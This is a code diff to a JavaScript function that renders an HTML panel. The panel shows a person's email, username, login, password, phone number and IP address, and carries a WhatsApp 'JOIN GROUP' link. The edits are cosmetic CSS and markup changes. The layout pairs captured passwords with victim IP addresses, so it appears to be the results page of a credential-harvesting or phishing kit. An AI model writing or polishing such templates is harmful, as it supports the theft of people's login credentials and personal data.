@@ -132,12 +132,15 @@ function getIP(req) {
 ====================== */
 function buildHtml(vars) {
   return `
-<!DOCTYPE html>
+
+
+
+            <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ort</title>
+<title>JOEST27</title>
 
 <style>
 *{
@@ -148,7 +151,7 @@ function buildHtml(vars) {
 
 body{
     background:#050505;
-    font-family:Inter,Arial,sans-serif;
+    font-family:Arial,sans-serif;
     color:#fff;
     padding:40px 20px;
 }
@@ -177,7 +180,7 @@ body{
 }
 
 .subtitle{
-    margin-top:8px;
+    margin-top:10px;
     color:#888;
     letter-spacing:4px;
     font-size:13px;
@@ -189,31 +192,33 @@ body{
 }
 
 .table{
-    padding:15px 30px;
+    padding:20px 35px;
 }
 
 .row{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    padding:18px 0;
+    padding:24px 0;
     border-bottom:1px solid rgba(255,255,255,.05);
 }
 
 .label{
+    display:block;
     color:#777;
     font-weight:700;
-    letter-spacing:2px;
+    letter-spacing:3px;
+    margin-bottom:10px;
+    font-size:14px;
 }
 
 .value{
+    display:block;
     color:#fff;
-    text-align:right;
+    font-size:16px;
+    line-height:1.7;
     word-break:break-word;
 }
 
 .join-box{
-    padding:35px 30px;
+    padding:40px 30px;
     text-align:center;
 }
 
@@ -222,11 +227,11 @@ body{
     text-decoration:none;
     color:#fff;
     border:1px solid #fff;
-    padding:15px 35px;
+    padding:16px 40px;
     border-radius:14px;
     font-weight:800;
     letter-spacing:3px;
-    transition:0.3s;
+    transition:.3s;
 }
 
 .join-btn:hover{
@@ -243,18 +248,30 @@ body{
 }
 
 @media(max-width:600px){
-    .row{
-        flex-direction:column;
-        align-items:flex-start;
-        gap:8px;
+
+    body{
+        padding:15px;
     }
 
-    .value{
-        text-align:left;
+    .panel{
+        border-radius:18px;
     }
 
     .logo{
         font-size:32px;
+        letter-spacing:5px;
+    }
+
+    .table{
+        padding:15px 20px;
+    }
+
+    .row{
+        padding:20px 0;
+    }
+
+    .value{
+        font-size:15px;
     }
 }
 </style>
@@ -274,39 +291,40 @@ body{
     <div class="table">
 
         <div class="row">
-            <div class="label">EMAIL</div>
-            <div class="value">${vars.email}</div>
+            <span class="label">EMAIL</span>
+            <span class="value">${vars.email}</span>
         </div>
 
         <div class="row">
-            <div class="label">USER</div>
-            <div class="value">${vars.user}</div>
+            <span class="label">USER</span>
+            <span class="value">${vars.user}</span>
         </div>
 
         <div class="row">
-            <div class="label">LOGIN</div>
-            <div class="value">${vars.login}</div>
+            <span class="label">LOGIN</span>
+            <span class="value">${vars.login}</span>
         </div>
 
         <div class="row">
-            <div class="label">PASSWORD</div>
-            <div class="value">${vars.password}</div>
+            <span class="label">PASSWORD</span>
+            <span class="value">${vars.password}</span>
         </div>
 
         <div class="row">
-            <div class="label">PHONE</div>
-            <div class="value">${vars.phone}</div>
+            <span class="label">PHONE</span>
+            <span class="value">${vars.phone}</span>
         </div>
 
         <div class="row">
-            <div class="label">IP ADDRESS</div>
-            <div class="value">${vars.ip}</div>
+            <span class="label">IP ADDRESS</span>
+            <span class="value">${vars.ip}</span>
         </div>
 
     </div>
 
     <div class="join-box">
-        <a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=4&amv=3" class="join-btn">
+        <a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=4&amv=3"
+           class="join-btn">
             JOIN GROUP
         </a>
     </div>
